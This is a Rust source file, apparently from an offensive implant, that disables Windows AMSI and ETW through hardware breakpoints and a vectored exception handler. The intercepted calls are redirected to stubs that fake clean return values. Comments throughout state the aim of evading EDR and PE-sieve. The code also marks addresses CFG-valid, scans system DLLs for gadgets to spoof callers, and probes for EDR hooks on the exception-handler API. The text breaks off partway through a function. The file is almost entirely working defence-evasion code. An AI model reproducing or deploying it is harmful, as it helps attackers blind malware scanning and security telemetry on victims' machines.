//! Hardware-breakpoint (HWBP) patchless blind — SOTA AMSI/ETW bypass.
//!
//! Sets DR0 execute breakpoint on target function's first instruction.
//! On STATUS_SINGLE_STEP, VEH handler redirects RIP to a shadow stub
//! that returns a clean value. Target function never executes.
//!
//! ## Why stealthier
//! - No `VirtualProtect` on a code page
//! - No in-memory byte modification (PE-sieve `.text` hash stays clean)
//! - Only debug register write + VEH registration
//!
//! ## VEH pattern (RF-based, single-phase)
//! 1. CPU hits DR0 → STATUS_SINGLE_STEP → VEH fires
//! 2. VEH sets RIP = shadow stub, sets Resume Flag (EFLAGS bit 16)
//! 3. RF tells CPU to skip the HWBP for ONE instruction → shadow executes
//! 4. Shadow stub sets RAX (clean return value) and ret → returns to caller
//! 5. Next call to the target fires the HWBP again (RF was one-shot)
//!
//! ## Concurrency / aliasing model (CRITICAL-6/7 fixes)
//!
//! All shared state uses atomic cells (`AtomicPtr`, `AtomicUsize`, `AtomicU8`)
//! or `Sync`-wrapped `UnsafeCell` pools, never `static mut`. The HWBP
//! subsystem is effectively single-threaded per slot: HWBPs are armed with the
//! DR7 *local-enable* (L) bit via `NtSetContextThread(NT_CURRENT_THREAD)`, so a
//! breakpoint only fires on the thread that armed it. The beacon thread is the
//! sole armer and the sole faulting thread. The VEH runs synchronously on the
//! faulting thread, so it never races another armer on the same thread.
//!
//! The atomics therefore exist primarily to satisfy Rust's aliasing model (no
//! `static mut` mutation), but they also provide a sound happens-before edge
//! for any future cross-thread HWBP use. Crucially, the VEH handler is
//! **lock-free**: it performs a single `Acquire` load per slot and never
//! returns `EXCEPTION_CONTINUE_SEARCH` because it failed to observe state —
//! the CRITICAL-7 process-kill bug. The only valid reasons for the handler to
//! pass the exception on are genuine "not our #DB" conditions (null pointers,
//! non-SINGLE_STEP code, no DR6 B-bits, no slot matching the faulting address).

#![cfg(target_os = "windows")]

// ---- Shadow type ---------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShadowType {
    EtwEaxZero,     // xor eax,eax; ret
    AmsiInvalidArg, // mov eax,0x80070057; ret
}

// ---- CONSTANTS -----------------------------------------------------------

/// STATUS_SINGLE_STEP — hardware breakpoint / single-step exception.
/// Windows NTSTATUS 0x80000004 as signed i32.
const STATUS_SINGLE_STEP: i32 = -0x7FFF_FFFC; // 0x80000004

/// Return this from VEH to discard context changes and keep searching.
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Return this from VEH to apply modified ContextRecord and resume.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

/// CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x10 = 0x100010.
const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

/// CONTEXT_CONTROL = RIP, EFlags, segment regs, etc. (0x100001 for AMD64).
const CONTEXT_CONTROL: u32 = 0x0010_0001;

/// CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS |
///                 CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS = 0x10001F
const CONTEXT_FULL_AMD64: u32 = 0x0010_001F;

const NT_CURRENT_THREAD: usize = 0xFFFF_FFFF_FFFF_FFFE;

/// EFLAGS Resume Flag — bit 16. When set, the CPU skips the next HWBP trigger
/// for exactly one instruction.
const RF_BIT: u32 = 1 << 16;

// ---- x64 CONTEXT offsets (verified against WinNT.h _CONTEXT AMD64) ------
//
//  0x030 ContextFlags   0x038 SegCs   0x044 EFlags
//  0x048 Dr0            0x050 Dr1     0x058 Dr2     0x060 Dr3
//  0x068 Dr6            0x070 Dr7
//  0x078 Rax            0x080 Rcx     0x088 Rdx     0x090 Rbx
//  0x098 Rsp            0x0A0 Rbp     0x0A8 Rsi     0x0B0 Rdi
//  0x0B8 R8  .. 0x0E8 R15   0x0F8 Rip
//  0x100 .. 0x2FF FltSave (XMM_SAVE_AREA32, 512B)
//  0x300 .. 0x49F VectorRegister[26]   0x4A0 VectorControl
//  0x4A8 .. 0x4D7 DebugControl, LastBranchTo/FromRip, LastExceptionTo/FromRip
//  TOTAL 1232 (0x4D0)

const CTX_CONTEXT_FLAGS: usize = 0x030;
const CTX_EFLAGS: usize = 0x044;
const CTX_DR0: usize = 0x048;
const CTX_DR6: usize = 0x068;
const CTX_DR7: usize = 0x070;
#[allow(dead_code)]
const CTX_RAX: usize = 0x078;
const CTX_RIP: usize = 0x0F8;

// ---- STATE (no `static mut` — CRITICAL-6 fix) ----------------------------
//
// Each HWBP slot is a fixed cell in the static `HWBP_POOL` whose data is
// mutated only by the single armer thread while the slot is in the CLAIMED
// state, and read by the VEH only while the slot is OBSERVED in the OCCUPIED
// state. Per-slot `AtomicU8` state bytes provide the Acquire/Release
// happens-before edge and satisfy the aliasing model without `static mut`.
//
// Slot state values used by the atomic protocol:
const SLOT_VACANT: u8 = 0; // free, available for add_hwbp to claim
const SLOT_OCCUPIED: u8 = 1; // armed; VEH may act on it
const SLOT_CLAIMED: u8 = 2; // add_hwbp/remove_hwbp is mid-update; VEH skips

#[allow(dead_code)]
#[derive(Debug, Clone, Copy)]
struct HwbpEntry {
    target: usize,
    shadow: usize,
    original_dr7: u64,
}

/// All-zero initializer (const). Used to zero the pool at startup.
const HWBP_ENTRY_ZERO: HwbpEntry = HwbpEntry {
    target: 0,
    shadow: 0,
    original_dr7: 0,
};

/// `Sync` wrapper around a value. Safe because access to the inner cell is
/// mediated by an external protocol (the per-slot `AtomicU8` state byte with
/// Acquire/Release ordering — see `add_hwbp`/`remove_hwbp`/`hwbp_veh_handler`).
/// The wrapper lets us place mutable backing storage in a `static` without
/// `static mut`.
struct SyncUnsafeCell<T>(core::cell::UnsafeCell<T>);
unsafe impl<T> Sync for SyncUnsafeCell<T> {}
impl<T> SyncUnsafeCell<T> {
    const fn new(v: T) -> Self {
        Self(core::cell::UnsafeCell::new(v))
    }
    /// Returns a raw pointer to the inner cell. The caller is responsible for
    /// the synchronization protocol that makes the access sound.
    fn get(&self) -> *mut T {
        self.0.get()
    }
}

// SAFETY: backing cells are only mutated by the single armer thread while the
// slot's AtomicU8 is in the CLAIMED state, and only read by the VEH while the
// slot is OBSERVED in the OCCUPIED state. The OCCUPIED→CLAIMED and
// CLAIMED→OCCUPIED transitions use Acquire/Release, giving a sound
// happens-before edge. See add_hwbp/remove_hwbp/hwbp_veh_handler.
static HWBP_POOL: [SyncUnsafeCell<HwbpEntry>; 4] = [
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
    SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
];

/// Per-slot state: SLOT_VACANT / SLOT_CLAIMED / SLOT_OCCUPIED. The VEH only
/// acts on OCCUPIED; `add_hwbp` claims via CAS(VACANT→CLAIMED), publishes via
/// store(CLAIMED→OCCUPIED, Release); `remove_hwbp` claims via
/// CAS(OCCUPIED→CLAIMED) then store(→VACANT, Release).
static HWBP_SLOT_STATE: [core::sync::atomic::AtomicU8; 4] = [
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
    core::sync::atomic::AtomicU8::new(SLOT_VACANT),
];

/// Live breakpoint count (also the source of truth for "remove the VEH when
/// zero"). Atomic for static-mut hygiene; writers are the add/remove paths.
static HWBP_COUNT: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);

/// VEH registration handle returned by `AddVectoredExceptionHandler`. Zero
/// (= null) when no handler is registered.
static VEH_HANDLE: core::sync::atomic::AtomicPtr<core::ffi::c_void> =
    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());

/// Shadow-stub page base (RW→RX page allocated by `init_shadow_buffer`).
/// Zero when not initialized.
static SHADOW_BUF: core::sync::atomic::AtomicPtr<u8> =
    core::sync::atomic::AtomicPtr::new(core::ptr::null_mut());

/// Post-mortem VEH diagnostic ring (hex dump of marker bytes). Race-tolerant:
/// only the VEH thread writes, and only when DIAG_ENABLED (selftest-only).
/// Wrapped in `SyncUnsafeCell` so the aliasing model is satisfied without
/// `static mut`.
static VEH_DIAG_BUF: SyncUnsafeCell<[u8; 128]> = SyncUnsafeCell::new([0u8; 128]);

/// true = VEH chain appears clean / safe to register our HWBP handler.
/// Set false by veh_chain_has_handlers() if probe detects pre-existing
/// handlers or EDR interference. Implant SHOULD check this before relying
/// on HWBP-based blind patches.
pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(true);

/// Initialize CFG bypass subsystem. Called during bootstrap.
/// Scans for proxy gadgets and return-address stubs in system DLLs.
/// The gadgets are available for future sync-exception proxy flows
/// (Micro-Stager). For async HWBP exceptions, CFG marking + direct
/// VEH registration is the current path.
///
/// # Safety
/// Must run after PEB-walk bootstrap. Single-threaded beacon context.
pub unsafe fn init_countermeasures() {
    // Scan for proxy gadgets (jmp rbx / call rbx in ntdll/kernelbase).
    if !crate::proxy_veh::proxy_available() {
        crate::proxy_veh::init_proxy_gadgets();
    }
    if crate::proxy_veh::proxy_available() {
        diag(b'G'); // gadget found
    }

    // Scan for return-address stub (ADD RSP,X; RET or bare RET in ntdll).
    if let Some(stub) = crate::caller_spoof::scan_return_stub() {
        diag(b'R'); // stub found
                    // Store for future use by caller-spoof thunk.
        let _ = stub;
    }
}

/// Runtime switch for diag() file writes. Defaults OFF in production.
/// Set to true via `set_diag_enabled(true)` during selftest only.
pub(crate) static DIAG_ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(false);

/// Enable/disable diag() file writes at runtime.
pub fn set_diag_enabled(on: bool) {
    DIAG_ENABLED.store(on, core::sync::atomic::Ordering::Release);
}

/// Write a single ASCII marker byte to C:\nyx\hwbp_diag.txt (append mode).
/// Used for step-by-step crash diagnostics during selftest ONLY.
/// **Gated behind DIAG_ENABLED** — production builds never write to disk.
pub(crate) unsafe fn diag(ch: u8) {
    if !DIAG_ENABLED.load(core::sync::atomic::Ordering::Acquire) {
        return;
    }
    let mut path = [0u16; 22];
    let name = b"C:\\nyx\\hwbp_diag.txt";
    let mut i = 0;
    while i < name.len() {
        path[i] = name[i] as u16;
        i += 1;
    }
    path[name.len()] = 0;

    type FnCreate = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut core::ffi::c_void,
        u32,
        u32,
        *mut core::ffi::c_void,
    ) -> *mut core::ffi::c_void;
    type FnWrite = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        *const u8,
        u32,
        *mut u32,
        *mut core::ffi::c_void,
    ) -> i32;
    type FnClose = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
    type FnSetFP = unsafe extern "system" fn(*mut core::ffi::c_void, i32, *mut i32, u32) -> u32;

    let Some(cf) = crate::resolve::export_addr(b"kernelbase.dll", b"CreateFileW")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CreateFileW"))
    else {
        return;
    };
    let Some(wf) = crate::resolve::export_addr(b"kernelbase.dll", b"WriteFile")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"WriteFile"))
    else {
        return;
    };
    let Some(ch_) = crate::resolve::export_addr(b"kernelbase.dll", b"CloseHandle")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle"))
    else {
        return;
    };
    let create_file: FnCreate = core::mem::transmute(cf);
    let write_file: FnWrite = core::mem::transmute(wf);
    let close_handle: FnClose = core::mem::transmute(ch_);

    let h = create_file(
        path.as_ptr(),
        4,
        3,
        core::ptr::null_mut(),
        4,
        0x80,
        core::ptr::null_mut(),
    );
    if h as isize == -1 {
        return;
    }
    if let Some(sfp) = crate::resolve::export_addr(b"kernelbase.dll", b"SetFilePointer")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"SetFilePointer"))
    {
        let set_fp: FnSetFP = core::mem::transmute(sfp);
        set_fp(h, 0, core::ptr::null_mut(), 2);
    }
    let byte = [ch];
    let mut nwritten: u32 = 0;
    let _ = write_file(h, byte.as_ptr(), 1, &mut nwritten, core::ptr::null_mut());
    close_handle(h);
}

// ---- INIT ----------------------------------------------------------------

pub unsafe fn init_shadow_buffer() -> bool {
    // Fast path: already initialized this process. Acquire so we see the
    // fully-written, RX-downgraded stubs if we observe a non-null base.
    if !SHADOW_BUF
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null()
    {
        return true;
    }
    let addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    {
        Some(a) => a,
        None => return false,
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let f: VAlloc = core::mem::transmute(addr);
    // MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_READWRITE = 0x04
    // Allocate as RW first, write shadow stubs, then downgrade to RX.
    let page = f(core::ptr::null_mut(), 0x1000, 0x3000, 0x04);
    if page.is_null() {
        return false;
    }
    let page_u8 = page as *mut u8;
    // SAFETY: page is a freshly-allocated 0x1000-byte RW page we own; we only
    // touch the first 64 bytes where the two stubs live.
    let buf = core::slice::from_raw_parts_mut(page_u8, 64);
    // Shadow stub 0: xor eax,eax; ret  (ETW → return 0 = success)
    buf[0] = 0x31;
    buf[1] = 0xC0;
    buf[2] = 0xC3;
    // Shadow stub 1: mov eax,0x80070057; ret  (AMSI → return E_INVALIDARG)
    buf[8] = 0xB8;
    buf[9] = 0x57;
    buf[10] = 0x00;
    buf[11] = 0x07;
    buf[12] = 0x80;
    buf[13] = 0xC3;

    // Downgrade page protection: PAGE_READWRITE → PAGE_EXECUTE_READ (0x20).
    // Shadow stubs are written once and never modified; RX is sufficient and
    // closes the RWX IOC that EDR/PE-sieve would flag.
    type FnVP = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
    let vp_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualProtect")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect"));
    if let Some(vp) = vp_addr {
        let vp_fn: FnVP = core::mem::transmute(vp);
        let mut old_protect: u32 = 0;
        // PAGE_EXECUTE_READ = 0x20
        let _ = vp_fn(page, 0x1000, 0x20, &mut old_protect);
    }

    // Publish the shadow buffer base with Release so any reader that observes
    // a non-null value also observes the fully-written, RX-downgraded stubs.
    SHADOW_BUF.store(page_u8, core::sync::atomic::Ordering::Release);
    true
}

unsafe fn shadow_addr(st: ShadowType) -> Option<usize> {
    let base = SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire);
    if base.is_null() {
        return None;
    }
    match st {
        ShadowType::EtwEaxZero => Some(base as usize),
        ShadowType::AmsiInvalidArg => Some(base as usize + 8),
    }
}

// ---- VEH HANDLER ---------------------------------------------------------

/// Vectored Exception Handler for HWBP interception.
///
/// Pattern (RF-based, single-phase):
/// - CPU hits DR0 execute breakpoint → #DB → EXCEPTION_SINGLE_STEP
/// - VEH fires: check DR6.B0–B3 to confirm which slot triggered
/// - If match: set RIP = shadow stub, set RF (bit 16) to skip breakpoint
///   for one instruction, return EXCEPTION_CONTINUE_EXECUTION
/// - Shadow stub runs (sets RAX + ret) → returns to caller cleanly
/// - Next call to the target fires the HWBP again (RF was one-shot)
///
/// CRITICAL-7 fix: this handler is **lock-free**. It never returns
/// `EXCEPTION_CONTINUE_SEARCH` because it failed to acquire state; it returns
/// `SEARCH` only for genuinely foreign exceptions (null pointers,
/// non-`STATUS_SINGLE_STEP` codes, no DR6 B-bits, or a B-bit whose slot is
/// not armed at this faulting address). The last case — a #DB on a slot we
/// are no longer interested in, or never armed — is the OS's job to keep
/// searching; if no other handler wants it, that is correct behavior (e.g. a
/// debugger's HWBP).

/// Record a byte into VEH_DIAG_BUF as hex for post-crash inspection.
/// Uses AtomicUsize for POS to avoid data races if VEH handler is re-entered.
unsafe fn vehtag(ch: u8) {
    use core::sync::atomic::AtomicUsize;
    static POS: AtomicUsize = AtomicUsize::new(0);
    let pos = POS.load(core::sync::atomic::Ordering::Relaxed);
    if pos < 126 {
        let hex = b"0123456789abcdef";
        // SAFETY: VEH_DIAG_BUF is a 128-byte SyncUnsafeCell-backed static.
        // pos<126 and pos+1<127 so both writes are in bounds. The single VEH
        // thread is the only writer; the buffer is documented best-effort
        // post-mortem data. We obtain a raw *mut via the wrapper's protocol
        // (the VEH is the sole writer of the diag buffer).
        let base: *mut u8 = VEH_DIAG_BUF.get().cast::<u8>();
        *base.add(pos) = hex[((ch >> 4) & 0xf) as usize];
        *base.add(pos + 1) = hex[(ch & 0xf) as usize];
        POS.store(pos + 2, core::sync::atomic::Ordering::Relaxed);
    }
}

/// Read VEH_DIAG_BUF contents (for post-mortem inspection).
pub unsafe fn read_veh_diag() -> [u8; 128] {
    // SAFETY: VEH_DIAG_BUF is a 128-byte static; we copy it out by value.
    // Concurrent writers (the VEH) may race, but the buffer is documented as
    // best-effort post-mortem data.
    core::ptr::read(VEH_DIAG_BUF.get())
}

#[no_mangle]
pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'V');
    } // VEH entered

    if ep == 0 {
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'0');
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // EXCEPTION_POINTERS: [+0] = PEXCEPTION_RECORD, [+8] = PCONTEXT
    // SAFETY: ep is the EXCEPTION_POINTERS pointer delivered by the OS to the
    // VEH. The two pointer-sized fields at +0/+8 are the exception record and
    // context record. Both are valid for the duration of the handler.
    let ep_ptr = ep as *const u8;
    let exr = core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8;
    let ctx = core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8;
    if exr.is_null() || ctx.is_null() {
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'N');
        } // null pointers
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // ExceptionRecord.ExceptionCode at offset +0x00 (i32)
    // SAFETY: exr points at a valid EXCEPTION_RECORD; ExceptionCode is the
    // first field.
    let code = core::ptr::read_unaligned(exr as *const i32);
    if code != STATUS_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'S');
    } // STATUS_SINGLE_STEP confirmed

    // Read DR6 — bits 0–3 indicate which slot triggered.
    // DR6 is in the CONTEXT at offset 0x068 (u64).
    // SAFETY: ctx points at a valid CONTEXT; DR6 is at offset 0x068.
    let dr6 = core::ptr::read_unaligned(ctx.add(CTX_DR6) as *const u64);

    // DR6 bit 14 (BS) = single-step. For HWBP, at least one of B0–B3 (bits 0–3)
    // should also be set. If BS is set but no B bits, it's a single-step trap
    // (e.g. from TF flag), not our HWBP.
    let slot_bits = dr6 & 0xF;
    if slot_bits == 0 {
        // No B0–B3 set → not a hardware breakpoint trigger, pass through.
        if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
            vehtag(b'b');
        } // no B bits
        return EXCEPTION_CONTINUE_SEARCH;
    }
    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'b' + slot_bits as u8);
    } // which slot(s)

    // ContextRecord.Rip at x64 CONTEXT offset 0x0F8.
    // SAFETY: ctx points at a valid CONTEXT; Rip is at offset 0x0F8.
    let rip = core::ptr::read_unaligned(ctx.add(CTX_RIP) as *const u64) as usize;

    // ExceptionAddress is in the EXCEPTION_RECORD at offset 0x10 on x64
    // (after ExceptionCode/Flags/Record/Address fields). For an execute
    // breakpoint this equals the target address.
    // SAFETY: exr points at a valid EXCEPTION_RECORD; ExceptionAddress is at
    // offset 0x10 on x64.
    let fault_addr = core::ptr::read_unaligned(exr.add(0x10) as *const usize) as usize;

    // ---- LOCK-FREE slot scan (CRITICAL-7 fix) ----
    //
    // No lock. For each B-bit set in DR6 we check whether the corresponding
    // slot is armed (OCCUPIED) and whether its target matches the faulting
    // address or RIP. If so we redirect and resume. If a slot is mid-update
    // (CLAIMED) or vacant, we skip it; the CPU will re-trap if the slot is
    // later armed and the address is hit again.
    //
    // A #DB whose B-bit points at a slot we have nothing to say about is
    // genuinely foreign (e.g. a debugger's HWBP, or a stale B-bit). Returning
    // SEARCH for it is correct — it is NOT the CRITICAL-7 "we gave up because
    // of a lock" case.
    for i in 0..4u8 {
        if (slot_bits & (1 << i)) == 0 {
            continue;
        }
        let state = HWBP_SLOT_STATE[i as usize].load(core::sync::atomic::Ordering::Acquire);
        if state != SLOT_OCCUPIED {
            // Slot not armed (vacant, or an armer/remover is mid-update). Skip;
            // the OS will re-dispatch a #DB if/when the slot is armed.
            continue;
        }
        // SAFETY: the slot is OBSERVED OCCUPIED (Acquire above), so the
        // armer's Release store of the state byte happened-after its writes
        // to this cell. We hold the Acquire load, giving us a happens-before
        // edge to read the cell through the pool. The cell pointer is stable
        // for the lifetime of the program (HWBP_POOL is a static). The armer
        // only mutates the cell while the slot is in the CLAIMED state, which
        // we did NOT observe, so our read is of a fully-initialized entry.
        let cell_ptr: *const HwbpEntry = HWBP_POOL[i as usize].get();
        let e: HwbpEntry = core::ptr::read_volatile(cell_ptr);
        if fault_addr == e.target || rip == e.target {
            // ====== HIT: redirect to shadow stub ======
            if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
                vehtag(b'R');
            } // redirecting

            // Clear DR6 — Windows doesn't auto-clear it, and stale bits cause
            // misidentification on the next exception.
            // SAFETY: ctx is a valid CONTEXT; DR6 is at offset 0x068.
            core::ptr::write_unaligned(ctx.add(CTX_DR6) as *mut u64, 0);

            // Set RIP to shadow stub (xor eax,eax;ret or mov eax,...;ret).
            // SAFETY: ctx is a valid CONTEXT; Rip is at offset 0x0F8.
            core::ptr::write_unaligned(ctx.add(CTX_RIP) as *mut u64, e.shadow as u64);

            // Set Resume Flag (EFLAGS bit 16) — tells CPU to skip the HWBP
            // trigger for exactly ONE instruction (the shadow stub).
            // SAFETY: ctx is a valid CONTEXT; EFlags is at offset 0x044.
            let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
            core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);

            // We need CONTEXT_CONTROL (at minimum) to apply EFlags+Rip, and
            // CONTEXT_DEBUG_REGISTERS to apply DR6 clear. Set the context
            // flags to ensure the OS applies all our changes.
            // SAFETY: ctx is a valid CONTEXT; ContextFlags is at offset 0x030.
            let flags = core::ptr::read_unaligned(ctx.add(CTX_CONTEXT_FLAGS) as *const u32);
            core::ptr::write_unaligned(
                ctx.add(CTX_CONTEXT_FLAGS) as *mut u32,
                flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
            );

            if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
                vehtag(b'X');
            } // done
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
        vehtag(b'M');
    } // no matching armed slot
    EXCEPTION_CONTINUE_SEARCH
}

// ---- VEH CHAIN PROBE ------------------------------------------------------

/// Dummy VEH handler — always continues search.
/// Used by `veh_chain_has_handlers` as a transient probe.
unsafe extern "system" fn probe_veh_handler(_ep: usize) -> i32 {
    EXCEPTION_CONTINUE_SEARCH // 0 — keep walking the chain
}

/// Probe whether the VEH chain has pre-existing handlers or EDR interference.
///
/// Strategy:
/// 1. Register a transient dummy handler via `AddVectoredExceptionHandler(1,…)`.
/// 2. Immediately remove it via `RemoveVectoredExceptionHandler`.
/// 3. If either call fails (null handle or zero return), the chain is likely
///    compromised — an EDR may be hooking the VEH API or already occupying it.
///
/// Returns `true` if the chain appears compromised (unsafe to register).
/// Returns `false` if the probe was clean (safe to register).
///
/// On failure, also sets `VEH_SAFE` to `false`.
pub(crate) fn veh_chain_has_handlers() -> bool {
    unsafe {
        // Resolve AddVectoredExceptionHandler
        let add_addr =
            match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
                .or_else(|| {
                    crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
                }) {
                Some(a) => a,
                None => {
                    VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
                    return true;
                }
            };
        type AddVEH = unsafe extern "system" fn(
            usize,
            unsafe extern "system" fn(usize) -> i32,
        ) -> *mut core::ffi::c_void;
        let add: AddVEH = core::mem::transmute(add_addr);

        // Resolve RemoveVectoredExceptionHandler
        let rm_addr =
            match crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
                .or_else(|| {
                    crate::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
                }) {
                Some(a) => a,
                None => {
                    VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
                    return true;
                }
            };
        type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
        let rm: RemoveVEH = core::mem::transmute(rm_addr);

        // Register probe at the front of the chain (First = 1).
        let handle = add(1, probe_veh_handler);
        if handle.is_null() {
            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
            return true;
        }

        // Remove the probe immediately.
        if rm(handle) == 0 {
            VEH_SAFE.store(false, core::sync::atomic::Ordering::Release);
            return true;
        }

        false // chain appears clean
    }
}
// ---- ADD / REMOVE --------------------------------------------------------

/// Write a u64 to the Context buffer at the given offset (via raw pointer).
unsafe fn ctx_write_u64_at(base: usize, off: usize, val: u64) {
    // SAFETY: caller guarantees base+off is a valid, writable address inside
    // a CONTEXT buffer. write_unaligned tolerates any alignment.
    core::ptr::write_unaligned((base + off) as *mut u64, val);
}

/// Write a u32 to the Context buffer at the given offset.
unsafe fn ctx_write_u32_at(base: usize, off: usize, val: u32) {
    // SAFETY: see ctx_write_u64_at.
    core::ptr::write_unaligned((base + off) as *mut u32, val);
}

/// Read a u64 from the Context buffer at the given offset.
unsafe fn ctx_read_u64_at(base: usize, off: usize) -> u64 {
    // SAFETY: caller guarantees base+off is a valid readable u64 inside a
    // CONTEXT buffer. read_unaligned tolerates any alignment.
    core::ptr::read_unaligned((base + off) as *const u64)
}

/// Claim a vacant slot for arming. Returns the slot index on success, or an
/// error string if all four slots are already armed/in-use. Uses a CAS so two
/// concurrent armers never grab the same slot.
fn claim_slot() -> Result<usize, &'static str> {
    for i in 0..4usize {
        if HWBP_SLOT_STATE[i]
            .compare_exchange(
                SLOT_VACANT,
                SLOT_CLAIMED,
                core::sync::atomic::Ordering::Acquire,
                core::sync::atomic::Ordering::Relaxed,
            )
            .is_ok()
        {
            return Ok(i);
        }
    }
    Err("all 4 DR slots full")
}

/// Set a hardware breakpoint on `target_addr` using the given shadow type.
///
/// Uses `NtGetContextThread` / `NtSetContextThread(NT_CURRENT_THREAD, ctx)`
/// with `CONTEXT_DEBUG_REGISTERS` for the set call.
///
/// Returns the DR slot index (0–3) on success.
///
/// # Arming protocol (CRITICAL-6/7)
///
/// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH skips CLAIMED slots.
/// 2. Resolve the shadow addr; bail (releasing the slot) if invalid.
/// 3. Register the VEH if not already registered (once, before any DR write).
/// 4. Arm the DR register via NtSetContextThread.
/// 5. Write the entry into the pool cell, then publish CLAIMED→OCCUPIED with
///    Release ordering. Only AFTER this point can the VEH act on the slot.
///
/// The DR bit is set BEFORE the slot is published. If a #DB somehow fired
/// between arming and publishing, the VEH would see CLAIMED and skip (the CPU
/// re-traps on the next execution, by which time we've published). We never
/// publish a slot whose DR bit isn't already set, so the VEH never observes an
// ── add_hwbp helpers ───────────────────────────────────────────────────────

/// Resolve NtGetContextThread and NtSetContextThread.
unsafe fn resolve_nt_context_fns() -> Result<
    (unsafe extern "system" fn(usize, usize) -> i32,
     unsafe extern "system" fn(usize, usize) -> i32),
    &'static str,
> {
    let ntgct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
        Some(a) => a,
        None => return Err("NtGetContextThread unresolved"),
    };
    let ntsct_addr = match crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
        Some(a) => a,
        None => return Err("NtSetContextThread unresolved"),
    };
    Ok((core::mem::transmute(ntgct_addr), core::mem::transmute(ntsct_addr)))
}

/// Register the VEH handler once. Returns an error if the chain is compromised
/// or AddVectoredExceptionHandler fails. Must be called BEFORE setting
/// breakpoints — the handler must be in place to catch #DB.
unsafe fn register_veh_once(slot: usize) -> Result<(), &'static str> {
    let veh_registered = !VEH_HANDLE
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null();
    if veh_registered {
        diag(b'e');
        return Ok(());
    }
    if !VEH_SAFE.load(core::sync::atomic::Ordering::Acquire) {
        diag(b'v');
        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
    }
    if veh_chain_has_handlers() {
        diag(b'V');
        return Err("VEH chain has pre-existing handlers; skipping HWBP registration");
    }
    diag(b'd');
    // CFG bypass: mark handler as valid indirect-call target.
    if crate::cfg_user::cfg_enabled() {
        crate::cfg_user::mark_addr_cfg_valid(hwbp_veh_handler as *const () as usize);
        let sb = SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire);
        if !sb.is_null() {
            crate::cfg_user::mark_addr_cfg_valid(sb as usize);
        }
    }
    let addr = match crate::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
